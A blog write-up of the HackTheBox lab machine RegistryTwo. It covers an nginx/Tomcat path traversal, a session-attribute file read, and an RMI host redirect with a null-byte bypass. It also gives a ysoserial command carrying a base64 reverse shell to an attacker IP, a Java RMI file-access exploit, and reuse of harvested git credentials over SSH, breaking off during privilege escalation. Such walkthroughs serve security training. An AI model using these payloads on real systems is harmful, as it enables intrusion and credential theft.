---
layout: post
title: HTB RegistryTwo Writeup  
subtitle: Insane Linux Box
thumbnail-img: /assets/img/registrytwo/registrytwo.png
tags: [HTB]
---

| Name | registrytwo |
| :------ |:--- |
| OS | Linux |
| DIFFICULTY | Insane |

## Port Scan
`nmap` finds four open TCP ports, SSH (22) and three HTTPS (443, 5000, 5001):
```
nmap -p- --min-rate=1000 -oN allPorts.nmap 10.10.11.223
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
5000/tcp open  upnp
5001/tcp open  commplex-link

nmap -p 22,443,5000,5001 -sVC -oN scriptScan.nmap 10.10.11.223
PORT     STATE SERVICE            VERSION                                                                                                                                                                                                                                                                                  
22/tcp   open  ssh                OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)                                                                                                                                                                                                                             
| ssh-hostkey:                                                                                                                                                                                                                                                                                                             
|   2048 fa:b0:03:98:7e:60:c2:f3:11:82:27:a1:35:77:9f:d3 (RSA)                                                                                                                                                                                                                                                             
|   256 f2:59:06:dc:33:b0:9f:a3:5e:b7:63:ff:61:35:9d:c5 (ECDSA)                                                                                                                                                                                                                                                            
|_  256 e3:ac:ab:ea:2b:d6:8e:f4:1f:b0:7b:05:0a:69:a5:37 (ED25519)                                                                                                                                                                                                                                                          
443/tcp  open  ssl/http           nginx 1.14.0 (Ubuntu)                                                                                                                                                                                                                                                                    
|_ssl-date: TLS randomness does not represent time                                                                                                                                                                                                                                                                         
|_http-server-header: nginx/1.14.0 (Ubuntu)                                                                                                                                                                                                                                                                                
| ssl-cert: Subject: organizationName=free-hosting/stateOrProvinceName=Berlin/countryName=DE                                                                                                                                                                                                                               
| Not valid before: 2023-02-01T20:19:22                                                                                                                                                                                                                                                                                    
|_Not valid after:  2024-02-01T20:19:22                                                                                                                                                                                                                                                                                    
|_http-title: Did not follow redirect to https://www.webhosting.htb/                                                                                                                                                                                                                                                       
5000/tcp open  ssl/http           Docker Registry (API: 2.0)                                                                                                                                                                                                                                                               
|_http-title: Site doesn't have a title.                                                                                                                                                                                                                                                                                   
| ssl-cert: Subject: commonName=*.webhosting.htb/organizationName=Acme, Inc./stateOrProvinceName=GD/countryName=CN                                                                                                                                                                                                         
| Subject Alternative Name: DNS:webhosting.htb, DNS:webhosting.htb                                                                                                                                                                                                                                                         
| Not valid before: 2023-03-26T21:32:06                                                                                                                                                                                                                                                                                    
|_Not valid after:  2024-03-25T21:32:06                                                                                                                                                                                                                                                                                    
5001/tcp open  ssl/commplex-link?                                                                                                                                                                                                                                                                                          
| ssl-cert: Subject: commonName=*.webhosting.htb/organizationName=Acme, Inc./stateOrProvinceName=GD/countryName=CN                                           
| Subject Alternative Name: DNS:webhosting.htb, DNS:webhosting.htb                                                                                           
| Not valid before: 2023-03-26T21:32:06                                                                                                                      
|_Not valid after:  2024-03-25T21:32:06                                                                                                                      
| tls-alpn:                                                                                                                                                  
|   h2                                                                                                                                                       
|_  http/1.1                                                                  
|_ssl-date: TLS randomness does not represent time        
| fingerprint-strings: 
|   FourOhFourRequest:              
|     HTTP/1.0 404 Not Found                                                  
|     Content-Type: text/plain; charset=utf-8       
|     X-Content-Type-Options: nosniff  
|     Date: Mon, 05 Feb 2024 04:09:42 GMT                                     
|     Content-Length: 10                                                                                                                                     
|     found                                                                   
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:                                 
|     HTTP/1.1 400 Bad Request                                                
|     Content-Type: text/plain; charset=utf-8                                 
|     Connection: close  
|     Request            
|   GetRequest:                                                               
|     HTTP/1.0 200 OK                                                         
|     Content-Type: text/html; charset=utf-8                               
|     Date: Mon, 05 Feb 2024 04:09:14 GMT                             
|     Content-Length: 26                                                      
|     <h1>Acme auth server</h1>                                               
|   HTTPOptions:                                                              
|     HTTP/1.0 200 OK            
|     Content-Type: text/html; charset=utf-8                                  
|     Date: Mon, 05 Feb 2024 04:09:15 GMT  
|     Content-Length: 26                                                      
|_    <h1>Acme auth server</h1>
```

## Enumeration
### 22/TCP SSH
`nmap` successfully determined the running version as "OpenSSH 7.6p1 Ubuntu 4ubuntu0.7." A brief online search led me to the corresponding [Launchpad site](https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.7). According to the information on the site, the identified version is associated with the Bionic 18.04 release.

During the assessment of this box, I conducted a search for public exploits related to SSH but found none. SSH is generally recognized as a secure protocol. Beyond the potential vulnerability of brute-forcing credentials, there are limited avenues for further enumeration on SSH. It remains a robust and reliable service for secure remote access.

### 443/TCP HTTPS
Upon navigating to [https://10.10.11.223](https://10.10.11.223), I was automatically redirected to [https://www.webhosting.htb/](https://www.webhosting.htb/), suggesting the presence of virtual hosting on this machine. To facilitate easier access, I included both `www.webhosting.htb` and `webhosting.htb` in my `/etc/hosts` file, assigning them the corresponding machine's IP.

Prior to exploring the webpage content, I used `ffuf` to scan for any additional subdomains on this server. Even though I didn't find any other subdomains it's good to check.
```
ffuf -u https://10.10.11.223 -H "Host: FUZZ.webhosting.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.11.223
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.webhosting.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

[Status: 200, Size: 23978, Words: 9500, Lines: 670, Duration: 65ms]
    * FUZZ: www
```

The homepage of [https://www.webhosting.htb/](https://www.webhosting.htb/)is a webhosting platform. 
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/1.png)

I went ahead and created an account and I was brought to the user dashboard. Here I can create new domains. I created a new one and it gave it a name of `978b4d8435c0`. This created a new domain for me and gave a template page of `index.html`
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/2.png)

When I press the `open` button it brings me to `https://www.static-978b4d8435c0.webhosting.htb/`, I got a error saying that my machine could not resolve it. However once I added that new sub domain to my `/etc/hosts` file it resolves and brings me to a `It Works` page. This is the `index.html` page. 
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/3.png)

## Docker Foothold
Following initial manual enumeration, my focus shifted towards identifying the underlying technology stack of the application to identify potential exploitation avenues. When I started doing my manual enumeration I started up burp and captured all of requests sent to the server. I went back to those requests and while analyzing them it became evident that the application is powered by `nginx`. I also observed the presence of a `JSESSIONID` in the headers. This distinctive identifier strongly indicates the utilization of a Java application, potentially running on Tomcat.

Further analysis revealed that the `/hosting` endpoint is specifically handled by tomcat, while all other requests are managed by `nginx`. This deduction was drawn from the fact that only requests directed to `/hosting` included the `JSESSIONID` header.
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/4.png)

When I see tomcat & `nginx` running at the same time my mind goes to this weird bug that was discovered by Orange Tsai. When supplying `/..;/` in the url, `nginx` does not treat it as up one directory but `tomcat` does. We can do some directory traversal with `https://www.webhosting.htb/hosting/..;/examples/`.
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/5.png)

Inside servlet examples there is a **very** dangerous function that can let us modify session data.
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/6.png)
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/7.png)


Clicking around the application I was able to get a new session variable when editing the content for the `index.html` page that was generated with my new domain.
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/8.png)
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/9.png)


Notice that it set it to `/tmp/c867a9a1cc463a484a23ec08873571ca`. The machine appears to be saving the file that I'm editing into the temp directory. We can try to set the new session attribute to be `/etc/passwd`, and see if it will display the contents.
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/10.png)

After a refreshing the editing page I get the contents of `/etc/passwd`.
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/11.png)

From here the next file to look is `/usr/local/tomcat/logs/catalina.2024-02-05.log`, the date at the end will need to be changed to the date that you are doing this box. This log file will give the name of the `.war` file used for the application. This is like a `.jar` file, it essentially is the application. The catalina logs contained the name of the `.war` file
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/12.png)

I'll now set my session attribute to be `/usr/local/tomcat/webapps/hosting.war`.
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/13.png)

Next we can `curl` the page containing the contents of `hosting.war` and save its output. I do this because the file is pretty large and the browser can do weird things with it. 
```
curl -i -s -k -X $'GET' \
    -H $'Host: www.webhosting.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-User: ?1' -H $'Te: trailers' -H $'Connection: close' \
    -b $'JSESSIONID=2396B568B8FB6E7B2099CE6BC97BDDE3' \
    $'https://www.webhosting.htb/hosting/edit?tmpId=3B7x00a91V5dEVB8RVCDmwJwnpkMANmeJBQq6usYKSTpd0eesSbydsQoelgELYSRr0hvpL83BvhF_4SVIJAmRg==' -o hosting.tmp
```

After striping out the HTML we are left with a base64 encoded version of the war file. **You have to strip out the html**.
```
base64 -d hosting.tmp >> hosting.war

file hosting.war 
hosting.war: Java archive data (JAR)
```

Now we have the source of the web application and can move further and reverse engineer it. To decompile it I'll use `jd-gui`
```
jd-gui hosting.war
```

Inside the application I found a new session attribute called `s_IsLoggedInUserRoleManager` that we can add to our session. This will give us manager permissions.
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/14.png)
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/15.png)


Once that attribute is set we have a new feature available to us called `Configuration`
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/16.png)

This page lets me change the amount of domains that I can create as well as the template page:
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/17.png)

Looking at the source it appears that we can update anything. It doesn't check for what parameters are passed, it will loop over the post parameters and put them into a map, and then update the setting.
```java
  public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {  
    if (!checkManager(request, response))  
      return;   
    Map<String, String> parameterMap = new HashMap<>();  
    request.getParameterMap().forEach((k, v) -> parameterMap.put(k, v[0]));  
    Settings.updateBy(parameterMap);  
    RequestDispatcher rd = request.getRequestDispatcher("/WEB-INF/jsp/configuration.jsp");  
    request.setAttribute("message", "Settings updated");  
    rd.include((ServletRequest)request, (ServletResponse)response);  
  }
```

An important configuration setting that warrants attention is the RMI (Remote Method Invocation) host. RMI is a mechanism in Java that facilitates communication between Java applications, even when running on separate machines. It enables one Java program to invoke methods in another as if they were part of the same program, despite being located on different machines. In the context of this application, certain methods are loaded from `registry.webhosting.htb`. With the ability to update the configuration it allows us to manipulate the rmi host and redirect the machine to grab functions from our own machine. This newfound control over the RMI host presents an avenue for code execution!

There is however a check in the code to make sure the host ends in `.htb`, but a null byte `%00` will bypass this.
```java
 public static FileService get() {
    try {
      String rmiHost = (String)Settings.get(String.class, "rmi.host", null);
      if (!rmiHost.contains(".htb"))
        rmiHost = "registry.webhosting.htb"; 
      System.setProperty("java.rmi.server.hostname", rmiHost);
      System.setProperty("com.sun.management.jmxremote.rmi.port", "9002");
      log.info(String.format("Connecting to %s:%d", new Object[] { rmiHost, Settings.get(Integer.class, "rmi.port", Integer.valueOf(9999)) }));
      Registry registry = LocateRegistry.getRegistry(rmiHost, ((Integer)Settings.get(Integer.class, "rmi.port", Integer.valueOf(9999))).intValue());
      return (FileService)registry.lookup("FileService");
    } catch (Exception e) {
      e.printStackTrace();
      throw new RuntimeException(e);
    } 
  }
```

Using our ability to update settings we change the RMI host to ourselves by adding `&rmi.host=10.10.14.4%00.htb` to the reconfigure POST request. Once its sent and clicking around the application we get a connection back, confirming that we updated the setting.
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/18.png)
```
curl -i -s -k -X $'POST' \
    -H $'Host: www.webhosting.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 102' -H $'Origin: https://www.webhosting.htb' -H $'Referer: https://www.webhosting.htb/hosting/reconfigure' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Te: trailers' -H $'Connection: close' \
    -b $'JSESSIONID=3B4FE0A1DCF5F21EA7D091BA6B06A9EB' \
    --data-binary $'domains.max=5&domains.start-template=%3Cbody%3E%0D%0A%3Ch1%3EIt+works%21%3C%2Fh1%3E%0D%0A%3C%2Fbody%3E&rmi.host=10.10.14.5%00.htb' \
    $'https://www.webhosting.htb/hosting/reconfigure'
```

To exploit this you will need a copy of [ysoserial](https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar), you will probably have to do a couple of things to get it to work. `ysoserial` does not work great with newer versions of Java, on my machine I had version 17 and it did not work. To fix this you can install version 11 and it will work:
```
sudo apt update -y  
sudo apt install openjdk-11-jdk
sudo update-alternatives --config java PICK JAVA 11
java --version
```

 Send the POST request shown above to update the RMI host, as the config resets pretty often. Then run the command below to host the payload, make sure to change the base64 to your IP. After going to https://www.webhosting.htb/hosting/panel you should get a connection back.
 ```
┌──(kali㉿kali)-[~/htb/registryTwo]
└─$ java -cp /opt/ysoserial/ysoserial-all.jar ysoserial.exploit.JRMPListener 9002 CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}"
```

And the connection:
```
┌──(kali㉿kali)-[~/htb/registryTwo]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.223] 42227
id
uid=1000(app) gid=1000(app) groups=1000(app)
```

## Docker Escape
The shell we get back is not a full TTY, and I couldn't get a full one easily. I know that I'm in a docker container because of the presence of `.dockerenv` in the root of the file system:
```
ls -la
total 72
drwxr-xr-x    1 root     root          4096 Jul  5  2023 .
drwxr-xr-x    1 root     root          4096 Jul  5  2023 ..
-rwxr-xr-x    1 root     root             0 Jul  4  2023 .dockerenv
drwxr-xr-x    1 root     root          4096 Jul  5  2023 bin
drwxr-xr-x    5 root     root           340 Feb  8 03:35 dev
drwxr-xr-x    1 root     root          4096 Jul  5  2023 etc
drwxr-xr-x    1 root     root          4096 Jul  5  2023 home
drwxr-xr-x    1 root     root          4096 Jul  5  2023 lib
drwxr-xr-x    5 root     root          4096 Jan  9  2018 media
drwxr-xr-x    2 root     root          4096 Jan  9  2018 mnt
dr-xr-xr-x  196 root     root             0 Feb  8 03:35 proc
drwx------    1 root     root          4096 Jul  5  2023 root
drwxr-xr-x    2 root     root          4096 Jul  5  2023 run
drwxr-xr-x    2 root     root          4096 Jul  5  2023 sbin
drwxr-xr-x    2 root     root          4096 Jul  5  2023 srv
dr-xr-xr-x   13 root     root             0 Feb  8 03:35 sys
drwxrwxrwt    1 root     root          4096 Jul  5  2023 tmp
drwxr-xr-x    1 root     root          4096 Jul  5  2023 usr
drwxr-xr-x    1 root     root          4096 Jul  5  2023 var
```

Looking at open ports on the machine port 9002 sticks out to me. There is a good chance that its the RMI port for `registry.webhosting.htb` that was referenced in the `.war` file we decompiled above. 
```
netstat -tulnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
[snip]
tcp        0      0 :::9002                 :::*                    LISTEN      -
```

In the decompile `.war` file we can see a public interface available called `FileService`. 
```java
package WEB-INF.classes.com.htb.hosting.rmi;

import com.htb.hosting.rmi.AbstractFile;
import java.io.IOException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.List;

public interface FileService extends Remote {
  List<AbstractFile> list(String paramString1, String paramString2) throws RemoteException;
  
  boolean uploadFile(String paramString1, String paramString2, byte[] paramArrayOfbyte) throws IOException;
  
  boolean delete(String paramString) throws RemoteException;
  
  boolean createDirectory(String paramString1, String paramString2) throws RemoteException;
  
  byte[] view(String paramString1, String paramString2) throws IOException;
  
  AbstractFile getFile(String paramString1, String paramString2) throws RemoteException;
  
  AbstractFile getFile(String paramString) throws RemoteException;
  
  void deleteDomain(String paramString) throws RemoteException;
  
  boolean newDomain(String paramString) throws RemoteException;
  
  byte[] view(String paramString) throws RemoteException;
}
```

**We can create a basic java program that we can use to read files from the host file system.** Compiling java can be a pain in the butt sometimes. To make the process easy I'll save the decompiled `.war` file to disk.

![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/19.png)

Then create a new directory and unzip the contents of the zip generated by `jd-gui`. We will then create another dir, and copy two directories to it, this is where we will be working from. These are the commands I ran
```
mkdir warDIR
cd warDIR
unzip hosting.war.src.zip
mkdir compile
cd compile
cp ../META-INF/MANIFEST.MF .
cp -r ../WEB-INF/classes/com .
```

After everything this is what you should see in your working dir.
```
┌──(kali㉿kali)-[~/htb/registryTwo/warDIR/compile]
└─$ ls
com  MANIFEST.MF
```

We can now create our java file that will be interacting with the service. I called it `Exploit.java`. You will need to change the `vhost` var to the name of the domain that we created in the web application. I took this code from the official walkthrough.
```java
package com.htb.hosting.rmi;

import java.io.BufferedReader;

import java.io.InputStreamReader;

import java.nio.charset.StandardCharsets;

import java.rmi.NotBoundException;

import java.rmi.RemoteException;

import java.rmi.registry.LocateRegistry;

import java.rmi.registry.Registry;

import java.util.List;

public class Exploit {

public static void main(final String[] args) throws Exception {

new Exploit().shell();

}

private final FileService svc;

public Exploit() throws RemoteException, NotBoundException {

final Registry registry = LocateRegistry.getRegistry("registry.webhosting.htb",

9002);

this.svc = (FileService) registry.lookup("FileService");

}

public void shell() throws Exception {

final BufferedReader reader = new BufferedReader(new

InputStreamReader(System.in));

String cmd;

while ((cmd = reader.readLine()) != null) {

final String[] arr = cmd.split(" ", 2);

final String rawCmd = arr[1];

final String vhostId = "1a72be394c52"; // the created subdomain

switch (arr[0]) {

case "ls":

final List<AbstractFile> files = this.svc.list(vhostId, "../../../" +

rawCmd);

files.forEach(s -> System.out.println(s.getAbsolutePath()));

break;

case "cat":

final byte[] b = this.svc.view(vhostId, "../../../" + rawCmd);

System.out.println(new String(b));

break;

case "write": // write <file> <string>

final String[] arrSpl = rawCmd.split(" ", 2);

this.svc.uploadFile(vhostId, "../../../" + arrSpl[0],

arrSpl[1].getBytes(StandardCharsets.UTF_8));

break;

}

}

}

}
```

Next we will edit `MANIFEST.MF`
```
Manifest-Version: 1.0
Main-Class: com.htb.hosting.rmi.Exploit
```

We will also have to edit the package decloration in `com/htb/hosting/rmi/AbstractFile.java` and `com/htb/hosting/rmi/FileService.java` to the following:
```
package com.htb.hosting.rmi;
```

**You also might have to manually copy paste the AbstractFile.java** I ran into this error while compiling if I just used the export from `jd-gui`. To fix this I just did a manual copy paste, its something with the white spaces.
```
root@22d3a255ab0f:/home/kali# javac Exploit.java                                                                                                             
./com/htb/hosting/rmi/AbstractFile.java:3: error: cannot find symbol
/*    */ public class AbstractFile implements Serializable {
                                              ^                 
  symbol: class Serializable      
./com/htb/hosting/rmi/AbstractFile.java:8: error: cannot find symbol
/*    */   public AbstractFile(String fileRef, String vhostId, String displayName, File file, String absolutePath, String relativePath, boolean isFile, boole
an isDirectory, long displaySize, String displayPermission, long displayModified, com.htb.hosting.rmi.AbstractFile parentFile) {
                                                                                   ^
  symbol:   class File
  location: class AbstractFile
./com/htb/hosting/rmi/AbstractFile.java:11: error: cannot find symbol
/*    */   private final String displayName; private final File file; private final String absolutePath; private final String relativePath; private final boo
lean isFile; private final boolean isDirectory; private final long displaySize; private final String displayPermission; private final long displayModified;
            
```

With all of that it is time to compile. The java version running on the container is version 8, so I'll spin up a quick docker container on my kali vm running java 8 to avoid issues.
```
┌──(kali㉿kali)-[~/htb/registryTwo/warDIR/compile]
└─$ sudo docker run -it --rm -v "$PWD:/home/kali" openjdk:8 bash
root@7225b56a7100:/# cd /home/kali
root@7225b56a7100:/home/kali# javac Exploit.java
root@7225b56a7100:/home/kali# mv Exploit.class com/htb/hosting/rmi
root@7225b56a7100:/home/kali# jar cfm Exploit.jar ./MANIFEST.MF -C . .
root@7225b56a7100:/home/kali# ls
Exploit.jar  Exploit.java  MANIFEST.MF  com
```

Now we will copy that file over to RegistryTwo, if everything works you should see no output.
```
┌──(kali㉿kali)-[~/htb/registryTwo/warDIR/compile]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..

ON DOCKER
bash-4.4$ wget 10.10.14.5/Exploit.jar
wget 10.10.14.5/Exploit.jar
Connecting to 10.10.14.5 (10.10.14.5:80)
Exploit.jar          100% |*******************************| 43142   0:00:00 ETA

bash-4.4$ java -jar Exploit.jar
java -jar Exploit.jar
```

We can now list files on the host!
```
ls /
/
/initrd.img
/opt
/sbin
/snap
/root
/var
```

Inside the home folder of the developer user I found some git creds
```
ls /home/developer
/home
/home/developer/.cache
/home/developer/.bash_logout
/home/developer/.bashrc
/home/developer/.bash_history
/home/developer/.git-credentials
/home/developer/user.txt
/home/developer/.gnupg
/home/developer/.profile
/home/developer/.vimrc
cat /home/developer/.git-credentials
https://irogir:qybWiMTRg0sIHz4beSTUzrVIl7t3YsCj9@github.com
```

Trying `irogir:qybWiMTRg0sIHz4beSTUzrVIl7t3YsCj9` via SSH got me in as `developer`!
```
┌──(kali㉿kali)-[~/htb/registryTwo/warDIR/compile]           
└─$ ssh developer@webhosting.htb                                
The authenticity of host 'webhosting.htb (10.10.11.223)' can't be established. 
ED25519 key fingerprint is SHA256:MAsPYw/jBZT2Jey1YCF7JJ36wOqpd37giePk2KngbpM. 
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'webhosting.htb' (ED25519) to the list of known hosts.
[snip]
28 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 18.04 at
https://ubuntu.com/18-04


Last login: Mon Jul 17 12:11:10 2023 from 10.10.14.23
developer@registry:~$ 
```
## Priv Esc
I started out my priv esc by looking at the running processes of the machine using `pspy`. The following section below stood out to me. `registry.jar` is the RMI service running on the machine that we exploited. `quarantine.jar` is a new one.
```
2024/02/11 00:19:53 CMD: UID=999   PID=3077   | /usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar /opt/registry.jar
[snip]
2024/02/11 00:22:01 CMD: UID=0     PID=3556   | /bin/sh -c for i in {1..6}; do /bin/bash /root/tomcat-app/reset.sh & sleep 10; done 
2024/02/11 00:22:01 CMD: UID=0     PID=3555   | /bin/sh -c /bin/bash /root/check-vhosts.sh 
2024/02/11 00:22:01 CMD: UID=0     PID=3554   | /usr/sbin/CRON -f 
2024/02/11 00:22:01 CMD: UID=0     PID=3560   | /bin/bash /root/check-vhosts.sh 
2024/02/11 00:22:01 CMD: UID=0     PID=3563   | /bin/bash /root/tomcat-app/reset.sh 
2024/02/11 00:23:01 CMD: UID=0     PID=3631   | /usr/local/sbin/vhosts-manage -m quarantine                                                      
2024/02/11 00:22:01 CMD: UID=0     PID=3565   | /usr/bin/java -jar /usr/share/vhost-manage/includes/quarantine.jar 
[snip]
2024/02/11 00:19:53 CMD: UID=999   PID=3077   | /usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar /opt/registry.jar
```

Because our exploitation thus far has been very heavily java based I'll copy `quarantine.jar` file over to my kali machine and decompile it. I used [RECAF](https://github.com/Col-E/Recaf`) to decompile the code as we can save any changes without a messy build process. It also only works with `.jar` files, so thats why I didnt use it on the `.war` file earlier.

The main function looks like it creates a new `Client` and then calls `.scan()`
```java
// Decompiled with: CFR 0.152
// Class Version: 8
package com.htb.hosting.rmi;

import com.htb.hosting.rmi.Client;

public class Main {
    public static void main(String[] args) {
        try {
            new Client().scan();
        }
        catch (Throwable e) {
            Client.out(1024, "an unknown error occurred", new Object[0]);
            e.printStackTrace();
        }
    }
}
```

The `Client` constructor connects to the same RMI instance on port 9002 that we exploited `FileService` on, however this time its using `QuarantineService`. `scan()` will get files from a config and then loops over them and calls `doScan()`.
```java
    public Client() throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry("localhost", 9002);
        QuarantineService server = (QuarantineService)registry.lookup("QuarantineService");
        this.config = server.getConfiguration();
        this.clamScan = new ClamScan(this.config);
    }

    public void scan() {
        File[] documentRoots = this.config.getMonitorDirectory().listFiles();
        if (documentRoots == null || documentRoots.length == 0) {
            Client.out(256, "exiting", new Object[0]);
            return;
        }
        Client.out("initialize scan for %d domains", documentRoots.length);
        for (File documentRoot : documentRoots) {
            this.doScan(documentRoot);
        }
    }
```

`doScan`, will scan the files. If they `FAILED` the scan `doScan()` will then pass the files to `quarantine()`. `quarantine()`, will then copy the files to a directory.
```java
    private void doScan(File file) {
        block12: {
            block11: {
                if (!file.isDirectory()) break block11;
                File[] files = file.listFiles();
                if (files == null) break block12;
                for (File f : files) {
                    this.doScan(f);
                }
                break block12;
            }
            try {
                Path path = file.toPath();
                try {
                    if (Files.isSymbolicLink(path)) {
                        Client.out(16, "skipping %s", file.getAbsolutePath());
                        return;
                    }
                }
                catch (Exception e) {
                    Client.out(16, "unknown error occurred when processing %s\n", file);
                    return;
                }
                ScanResult scanResult = this.clamScan.scanPath(path.toAbsolutePath().toString());
                switch (scanResult.getStatus()) {
                    case ERROR: {
                        Client.out(768, "there was an error when checking %s", file.getAbsolutePath());
                        break;
                    }
                    case FAILED: {
                        Client.out(32, "%s was identified as a potential risk. applying quarantine ...", file.getAbsolutePath());
                        this.quarantine(file);
                        break;
                    }
                    case PASSED: {
                        Client.out(0, "%s status ok", file.getAbsolutePath());
                    }
                }
            }
            catch (IOException e) {
                Client.out(512, "io error processing %s", file.getAbsolutePath());
            }
        }
    }

    private void quarantine(File srcFile) {
        File destFolder = new File(this.config.getQuarantineDirectory(), "quarantine-run-" + LocalDateTime.now());
        destFolder.mkdirs();
        try {
            File dstFile = new File(destFolder, this.getQuarantineFileName(srcFile));
            Files.copy(srcFile.toPath(), dstFile.toPath(), LinkOption.NOFOLLOW_LINKS, StandardCopyOption.REPLACE_EXISTING);
            Client.out("%s was successfully scanned", srcFile.getAbsolutePath());
        }
        catch (IOException e) {
            Client.out(512, "io error processing %s", srcFile.getAbsolutePath());
        }
    }
```

So every so often this program is run by root, connecting to the RMI server and doing a ClamAV scan.

I wanted to look into `QuarantineService` more so I copied `registry.jar`, and decompiled it with  [RECAF](https://github.com/Col-E/Recaf`).

Inside `com/htb/hosting/rmi/quarantine/QuarantineServiceImpl` has some configuration that were used by the client.
```java
ackage com.htb.hosting.rmi.quarantine;

import com.htb.hosting.rmi.FileServiceConstants;
import com.htb.hosting.rmi.quarantine.QuarantineConfiguration;
import com.htb.hosting.rmi.quarantine.QuarantineService;
import java.io.File;
import java.rmi.RemoteException;
import java.util.logging.Logger;

public class QuarantineServiceImpl
implements QuarantineService {
    private static final Logger logger = Logger.getLogger(QuarantineServiceImpl.class.getSimpleName());
    private static final QuarantineConfiguration DEFAULT_CONFIG = new QuarantineConfiguration(new File("/root/quarantine"), FileServiceConstants.SITES_DIRECTORY, "localhost", 3310, 1000);

    @Override
    public QuarantineConfiguration getConfiguration() throws RemoteException {
        logger.info("client fetching configuration");
        return DEFAULT_CONFIG;
    }
}

```

Now that we know that `registry.jar` is the RMI service (`FileService` and `QuarantineService`) and  `quarantine.jar` a RMI client that connects to `registry.jar` to do vuln scans we can look at exploiting this.

Going back to the `pspy` output we can see that root is running the client that is connecting to the RMI service. We also see that a user of UID=999 is restarting the `registry.jar` file every so often.
```
2024/02/11 00:19:53 CMD: UID=999   PID=3077   | /usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar /opt/registry.jar
[snip]
2024/02/11 00:22:01 CMD: UID=0     PID=3556   | /bin/sh -c for i in {1..6}; do /bin/bash /root/tomcat-app/reset.sh & sleep 10; done 
2024/02/11 00:22:01 CMD: UID=0     PID=3555   | /bin/sh -c /bin/bash /root/check-vhosts.sh 
2024/02/11 00:22:01 CMD: UID=0     PID=3554   | /usr/sbin/CRON -f 
